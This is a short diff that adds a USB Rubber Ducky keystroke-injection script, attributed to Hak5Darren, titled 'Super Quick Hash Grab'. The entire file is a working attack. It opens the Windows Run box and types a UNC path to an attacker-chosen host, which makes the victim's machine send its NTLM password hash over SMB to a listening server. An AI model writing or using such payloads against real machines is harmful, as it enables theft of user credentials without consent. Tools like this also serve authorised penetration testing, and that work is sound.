@@ -1,0 +1,12 @@
+REM Title: Super Quick Hash Grab Payload for USB Rubber Ducky
+REM Author: Hak5Darren
+REM Description: Initiates a CIFS/SMB connection to a listening smbserver to obtain user hash.
+REM Target: Windows 95 and greater
+DEFINE HOSTNAME example.com
+DELAY 1000
+GUI r
+DELAY 100
+STRING \\
+STRING HOSTNAME
+STRING \HASH
+ENTER
